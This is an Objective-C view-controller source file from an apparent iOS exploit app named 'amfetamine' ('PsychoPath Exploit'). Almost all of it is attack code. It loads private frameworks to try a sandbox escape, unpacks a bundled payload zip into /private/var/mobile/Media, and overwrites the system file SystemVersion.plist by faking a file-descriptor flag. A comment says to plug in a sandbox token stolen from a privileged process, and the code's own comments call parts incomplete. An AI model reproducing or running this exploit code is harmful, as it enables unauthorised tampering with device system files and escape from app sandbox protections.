//
//  ViewController.m
//  amfetamine
//
//  Created by Sem Voigtländer on 19/11/2017.
//  Copyright © 2017 Sem Voigtländer. All rights reserved.
//

#import "ViewController.h"
#import "PrivateAPIManager.h"
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <mach/mach.h>
#include <pthread.h>
#include <unistd.h>
#include <stdbool.h>

#define die() return;

@interface ViewController ()
@property (weak, nonatomic) IBOutlet UIButton *exploit;
- (IBAction)doExploit:(id)sender;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
}

- (void)viewDidAppear:(BOOL)animated {
    [super viewDidAppear:animated];
    printf("=== PsychoPath Exploit ====\n");
}


- (void) exit_with_failure:(NSString*)reason retry:(bool)retry{
    dispatch_async(dispatch_get_main_queue(), ^(void){
        [_exploit setTitle:reason forState:UIControlStateDisabled];
        [_exploit setEnabled:retry];
    });
}

- (void) change_exploit_status:(NSString*)status {
    [_exploit setTitle:status forState:UIControlStateDisabled];
}

- (IBAction)doExploit:(id)sender {
    printf("[INFO] Welcome, starting exploit..\n\n");
    dispatch_async(dispatch_get_main_queue(), ^(void){
        [_exploit setEnabled:false];
    });
    
    /* Load the private frameworks */
    [self change_exploit_status:@"Setting up..."];
    if(![PrivateAPI loadPrivateAPIWithPath:@"/System/Library/PrivateFrameworks/MobileBackup.framework"]) {
        [self exit_with_failure:@"Unable to load PFW" retry:false];
        die();
    } else if (![PrivateAPI loadPrivateAPIWithPath:@"/System/Library/PrivateFrameworks/MediaServices.framework"]) {
        [self exit_with_failure:@"Unable to load PFW" retry:false];
        die();
    } else if (![PrivateAPI loadPrivateAPIWithPath:@"/System/Library/PrivateFrameworks/StreamingZip.framework"]){
        [self exit_with_failure:@"Unable to load PFW" retry:false];
        die();
    } else if (![PrivateAPI loadPrivateAPIWithPath:@"/System/Library/PrivateFrameworks/CalendarFoundation.framework"]){
        [self exit_with_failure:@"Unable to load PFW" retry:false];
        die();
    }

    /* Setup the class symbols */
    Class MBFileManager = NSClassFromString(@"MBFileManager"); //From MobileBackup
    Class MSVZipArchive = NSClassFromString(@"MSVZipArchive"); //From MediaServices
    Class SZExtractor = NSClassFromString(@"SZExtractor"); //From StreamingZip
    Class StreamingUnzipper = NSClassFromString(@"StreamingUnzipper"); //From StreamingZip
    Class CalLogFileWriter = NSClassFromString(@"CalLogFileWriter"); //From CalendarFoundation
    /* Verify that the symbols are correctly set up */
    if(MBFileManager == nil) {
        [self exit_with_failure:@"Got NULL Symbol :(" retry:true];
        die();
    } else if (MSVZipArchive == nil) {
        [self exit_with_failure:@"Got NULL Symbol :(" retry:true];
        die();
    } else if (SZExtractor == nil) {
        [self exit_with_failure:@"Got NULL Symbol :(" retry:true];
        die();
    } else if (StreamingUnzipper == nil) {
        [self exit_with_failure:@"Got NULL Symbol :(" retry:true];
        die();
    } else if (CalLogFileWriter == nil) {
        [self exit_with_failure:@"Got NULL Symbol :(" retry:true];
        die();
    }

    /* Create instances for the classes */
    id MBFileManagerInstance = [MBFileManager alloc]; //From MobileBackup
    id MSVZipArchiveInstance = [MSVZipArchive alloc]; //From MediaServices
    id SZExtractorInstance = [SZExtractor alloc]; //From StreamingZip
    id StreamingUnzipperInstance = [StreamingUnzipper alloc]; //From StreamingZip
    id CalLogFileWriterInstance = [CalLogFileWriter alloc]; //From CalendarFoundation
    id inProcessUnzipper = [SZExtractorInstance valueForKey:@"_inProcessUnzipper"]; //From StreamingZip
    
    /* Set up payload variables */
    NSString* containerDocumentsFolder = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) objectAtIndex:0]; //Application files dir
    
    NSString* zipPayloadPath = [[NSBundle mainBundle] pathForResource:@"Payload" ofType:@"zip"];
    NSData *zipPayloadInBytes = [NSData dataWithContentsOfFile:zipPayloadPath];
    NSString* payloadTargetPath = @"/private/var/mobile/Media/";
    
    NSString* coreservicesPath = @"/System/Library/CoreServices";
    NSArray* contentsOfCoreServices;
    NSString *systemVersionPayload = @"<key>ProductVersion</key>\n<string>8.4.1</string><key>Exploit By</key>\n<string>Sem Voigtlander</string>";
    /* Check for SystemVersion.plist */
    printf("[STATUS] Checking for SystemVersion.plist...\n");
    contentsOfCoreServices = [MBFileManagerInstance directoryContentsAtPath:coreservicesPath];
    if([contentsOfCoreServices containsObject:@"SystemVersion.plist"]) {
        printf("[INFO] SystemVersion.plist is intact.\n\n");
    }
    
    /* Trying extraction with MSVZipArchive */
    printf("[STATUS] Trying to extract zip to /tmp using MSVZipArchive...\n");
    [MSVZipArchiveInstance setValue:zipPayloadPath forKey:@"_archivePath"];
    NSError *error;
    [MSVZipArchiveInstance decompressToPath:payloadTargetPath withError:&error];
    
    /* Checking if the extraction successfully completed */
    if(error != nil) {
        
        /* Checking if the MSVZipArchive works inside the sandbox */
        printf("[ERROR] Cannot extract because %s\n\n", [error.localizedDescription UTF8String]);
        printf("[STATUS] Checking if MSVZipArchive actually works...\n");
        [MSVZipArchiveInstance decompressToPath:containerDocumentsFolder withError:&error];
        
        /* Checking if the extraction successfully completed */
        
        if(error != nil) {
            printf("Seems like the MSVZipArcive framework doesn't work\n");
        
        } else {
            printf("The framework works fine.\n");
            printf("Directory got payload contents:\n");
            
            /* Printing out the contents of the directory after extraction file by file */
            NSArray* contents = [MBFileManagerInstance directoryContentsAtPath:containerDocumentsFolder];
            for(int i = 0; i < contents.count; i++) {
                printf("\t- %s\n", [contents[i] UTF8String]);
            }
            printf("\n");
        }
    }
    
    /* Trying to write to SystemVersion with CalendarFoundation */
    
    //Set the path property to the path of SystemVersion.plist
    [CalLogFileWriterInstance setValue:@"/System/Library/CoreServices/SystemVersion.plist" forKey:@"_path"];
    
    //Read the contents of SystemVersion.plist into a string
    NSString* SystemVersion = [NSString stringWithContentsOfFile:@"/System/Library/CoreServices/SystemVersion.plist"];
    
    //Fake the file descriptors by setting the property to true
    [CalLogFileWriterInstance setValue:[NSNumber numberWithBool:true] forKey:@"_fileDescriptorIsValid"];
    
    //Check if SystemVersion.plist was patched before if not then write our payload to it
    if(![SystemVersion containsString:systemVersionPayload]) {
        [CalLogFileWriterInstance write:systemVersionPayload];
        
        //Read SystemVersion.plist again, print it's contents for human verification and check if the write operation succeeded
        SystemVersion = [NSString stringWithContentsOfFile:@"/System/Library/CoreServices/SystemVersion.plist"];
        printf("Got SystemVersion.plist: \n\n%s\n", [SystemVersion UTF8String]);
        if(![SystemVersion containsString:systemVersionPayload]) {
            printf("Seems like the modification failed :(\n\n");
        }
    } else {
        printf("Your systemversion file is already patched!");
    }
    
    /* Trying with StreamingZip */
    
    /* Enable verbose extracting in common */
    [self change_exploit_status:@"Starting exploit"];
    [SZExtractor enableDebugLogging];
    
    /* Create an Extractor Delegate */
    id delegate = [SZExtractorInstance valueForKey:@"delegate"];
    id delegateInstance = [delegate alloc];
    
    /* Enable verbose extracting for the delegate */
    [delegate enableDebugLogging];
    
    /* Initialise with the /tmp path which is a writable directory outside the sandbox */
    [self change_exploit_status:@"Setting up extractor"];
    [delegateInstance initForLocalExtractionWithPath:payloadTargetPath options:nil];
    
    /* Setting the actual unzipper with a path outside of the sandbox
     * Note: The sandbox extension token stil needs some work, and is invalid as for now
     */
    
    inProcessUnzipper = [StreamingUnzipper alloc];
    /* Supply bytes to the unzipper */
    [delegateInstance supplyBytes:zipPayloadInBytes withCompletionBlock:^(void){
        printf("Successfully initialized!\n");
    }];
    [inProcessUnzipper supplyBytes:zipPayloadInBytes withReply:^(void){
        printf("Unzipping stuff to %s\n", [zipPayloadPath UTF8String]);
    }];
    [self change_exploit_status:@"Extracting..."];
    
    char* sandboxToken = "0xffffffff"; //Replace this with a stolen sandboxToken from a privileged process, for example using triple_fetch
    printf("SandBoxToken: %s\n", sandboxToken);
    
    /* Perform the extraction */
    [inProcessUnzipper setupUnzipperWithOutputPath:payloadTargetPath sandboxExtensionToken:sandboxToken options:@{} withReply:^(NSError *e){
        //If an error occured (Most probably the symlink error which proves Luca Todesco's vulnerability)
        if(e!=nil) {
            [NSThread detachNewThreadWithBlock:^(void){
                dispatch_async(dispatch_get_main_queue(), ^(void){
                    [self exit_with_failure:@"Failed" retry:false];
                    //Dont die here, this is a different thread
                });
            }];
            die(); // <-- Die as we failed in exploitation
            
            //XPC_TRANSACTION_UNDERFLOW will occur here causing app termination as we did not provide an XPC Client for the StreamingZip instance
        }
        printf("Extracting payload..\n");
    }];
    
    /* Cleaning up, we're done now */
    SZExtractor = NULL;
    StreamingUnzipper = NULL;
    [self change_exploit_status:@"Done!"];
}



/* Fake selectors so our compiler won't cry */
- (void)enableDebugLogging {
    
}

- (void)write:(id)arg1 {
    
}

- (BOOL)decompressToPath:(id)arg1 withError:(id*)arg2 {
    return FALSE;
}

- (void) addExtension:(id)ext {
    
}
- (void)removeFileAtPath:(id)arg1 {
    printf("Did something\n");
    return;
}
- (void)setRootPath:(id)arg1 {
    printf("Did something\n");
    return;
}

- (void)initForLocalExtractionWithPath:(id)arg1 options:(id)arg2 {
    printf("Did something\n");
    return;
}
- (void)setupUnzipperWithOutputPath:(id)arg1 sandboxExtensionToken:(char *)arg2 options:(id)arg3 withReply:(id)arg4 {
    printf("Did something\n");
    return;
}

- (void)supplyBytes:(id)arg1 withReply:(id /* block */)arg2 {
    printf("Did something\n");
}
- (void)supplyBytes:(id)arg1 withCompletionBlock:(id /* block */)arg2 {
    printf("Did something\n");
}
+ (BOOL)hardlinkOrCopyFileFromPath:(id)arg1 toPath:(id)arg2 outError:(id*)arg3 {
    return true;
}
@end
